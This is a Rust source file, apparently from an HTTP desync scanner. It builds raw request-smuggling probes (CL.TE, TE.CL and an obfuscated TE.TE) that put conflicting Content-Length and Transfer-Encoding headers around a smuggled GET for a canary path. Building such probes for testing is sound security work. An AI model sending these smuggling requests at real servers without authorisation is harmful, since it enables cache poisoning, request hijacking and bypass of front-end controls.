pub struct Technique {
    pub name: &'static str,
    pub request_line: String,
    pub header_lines: Vec<String>,
    pub body: Vec<u8>,
}

const CRLF: &str = "\r\n";
const CHUNKED: &str = "chunked";

pub struct Probe {
    pub technique: Technique,
    pub raw_request: Vec<u8>,
}

struct RequestHead {
    request_line: String,
    lines: Vec<String>,
}

pub fn all_techniques(host: &str, path: &str, method: &str, canary: &str, extra: &[(String, String)]) -> Vec<Technique> {
    vec![
        cl_te(host, path, method, canary, extra),
        te_cl(host, path, method, canary, extra),
        te_te_obfuscated(host, path, method, canary, extra),
    ]
}

impl Probe {
    pub fn build(technique: Technique) -> Self {
        let raw = build_raw(&technique);
        Self { technique, raw_request: raw }
    }
}

fn build_raw(t: &Technique) -> Vec<u8> {
    let mut r = Vec::new();
    r.extend_from_slice(t.request_line.as_bytes());
    r.extend_from_slice(CRLF.as_bytes());
    for line in &t.header_lines {
        r.extend_from_slice(line.as_bytes());
        r.extend_from_slice(CRLF.as_bytes());
    }
    r.extend_from_slice(CRLF.as_bytes());
    r.extend_from_slice(&t.body);
    r
}

fn base_headers(host: &str, path: &str, method: &str, extra: &[(String, String)]) -> RequestHead {
    let request_line = format!("{method} {path} HTTP/1.1");
    let mut lines = vec![format!("Host: {host}")];
    for (k, v) in extra {
        lines.push(format!("{k}: {v}"));
    }
    RequestHead { request_line, lines }
}

fn smuggled_prefix(host: &str, canary: &str) -> String {
    format!("GET {canary} HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}")
}

fn cl_te(host: &str, path: &str, method: &str, canary: &str, extra: &[(String, String)]) -> Technique {
    let smuggled = smuggled_prefix(host, canary);
    let chunked_body = format!("0{CRLF}{CRLF}{smuggled}");
    let head = base_headers(host, path, method, extra);
    let cl = chunked_body.len().to_string();
    let mut lines = head.lines;
    lines.push(format!("Content-Length: {cl}"));
    lines.push(format!("Transfer-Encoding: {CHUNKED}"));
    Technique { name: "CL.TE", request_line: head.request_line, header_lines: lines, body: chunked_body.into_bytes() }
}

fn te_cl(host: &str, path: &str, method: &str, canary: &str, extra: &[(String, String)]) -> Technique {
    let smuggled = smuggled_prefix(host, canary);
    let chunked = format!("0{CRLF}{CRLF}");
    let chunked_len = chunked.len();
    let body = format!("{chunked}{smuggled}");
    let head = base_headers(host, path, method, extra);
    let mut lines = head.lines;
    lines.push(format!("Transfer-Encoding: {CHUNKED}"));
    lines.push(format!("Content-Length: {chunked_len}"));
    Technique { name: "TE.CL", request_line: head.request_line, header_lines: lines, body: body.into_bytes() }
}

fn te_te_obfuscated(host: &str, path: &str, method: &str, canary: &str, extra: &[(String, String)]) -> Technique {
    let smuggled = smuggled_prefix(host, canary);
    let chunked_body = format!("0{CRLF}{CRLF}{smuggled}");
    let head = base_headers(host, path, method, extra);
    let cl = chunked_body.len().to_string();
    let mut lines = head.lines;
    lines.push(format!("Content-Length: {cl}"));
    lines.push("Transfer-Encoding: chunked".to_string());
    lines.push("Transfer-Encoding: x".to_string());
    Technique { name: "TE.TE", request_line: head.request_line, header_lines: lines, body: chunked_body.into_bytes() }
}
